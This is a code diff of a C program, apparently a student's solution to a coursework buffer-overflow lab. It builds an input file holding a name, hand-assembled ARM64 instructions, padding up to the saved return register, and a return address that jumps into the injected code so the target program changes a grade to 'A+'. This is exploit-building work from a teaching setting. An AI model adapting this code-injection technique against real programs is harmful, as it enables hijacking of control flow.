@@ -25,7 +25,7 @@ int main(void)
    char* psName;
    FILE *psFile;
    psFile = fopen("dataAplus", "w");
-   psName = "SeanW";
+   psName = "Sean Wang";
 
    /* Writes the student's name to the dataA file */
    for (i = 0; i<strlen(psName); i++){
@@ -42,8 +42,8 @@ int main(void)
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction bl printf - SUB ONCE BUG FIXED */
-   /*uiInstr = MiniAssembler_bl(0x400600, 0x420064);*/
-   uiInstr = MiniAssembler_mov(0, 'A'); 
+   /*uiInstr = MiniAssembler_bl(0x400600, 0x420068);*/
+   uiInstr = MiniAssembler_bl(0x400600, 0x420068);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction mov w0, ‘+’ */
@@ -52,7 +52,7 @@ int main(void)
 
    /* Writes the instruction bl printf - SUB ONCE BUG FIXED */
    /* uiInstr = MiniAssembler_bl(0x400600, 0x42006C); */
-   uiInstr = MiniAssembler_mov(0, '+');
+   uiInstr = MiniAssembler_bl(0x400600, 0x420070);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction mov w0, ‘\0’ */
@@ -61,7 +61,7 @@ int main(void)
  
    /* Writes the instruction adr x1, grade */
    uiInstr = MiniAssembler_adr(1, 0x420044,
-   0x420074);
+   0x420078);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction strb w0, [x1] */
@@ -69,18 +69,18 @@ int main(void)
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
    /* Writes the instruction b 0x400864 (call of printf) */
-   uiInstr = MiniAssembler_b(0x400864, 0x42007C);
+   uiInstr = MiniAssembler_b(0x400864, 0x420080);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-   /* Writes enough null bytes to the dataB file
+   /* Writes enough null bytes to the dataAplus file
    to overrun until X30 */
-   for (i = 0; i<BUFSIZE-40; i++){
+   for (i = 0; i<BUFSIZE-44; i++){
        fprintf(psFile, "%c", 0x00);
    }
 
    /* Writes the address which corresponds to 
    instruction: mov w0, ‘A’ in BSS section */
-   ulData = 0x420060;
+   ulData = 0x420064;
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
 
    fclose(psFile);
